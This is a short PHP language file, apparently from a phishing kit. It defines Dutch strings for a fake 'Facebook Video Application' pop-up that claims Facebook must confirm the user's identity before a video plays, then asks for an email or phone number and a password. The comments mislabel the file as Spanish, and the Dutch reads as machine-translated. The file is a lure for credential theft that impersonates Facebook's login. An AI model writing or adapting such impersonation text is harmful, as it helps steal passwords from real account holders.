<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'nl';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook applicatie';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Application (Vrije)';
$lang['POPUP_DESCRIPCION'] = 'Facebook moet de volgende informatie te bevestigen, zodat de toegang tot deze applicatie video, login!';
$lang['POPUP_CORREO'] = 'E-mailadres of telefoonnummer';
$lang['POPUP_CONTRASENA'] = 'Wachtwoord';
$lang['POPUP_SUBMIT'] = 'Aanmelden';
$lang['POPUP_CANDADO'] = 'Deze toepassing is niet toegestaan om te publiceren op Facebook.';

/*
$langNl = array("Netherlands", "Belgium", "Suriname")
*/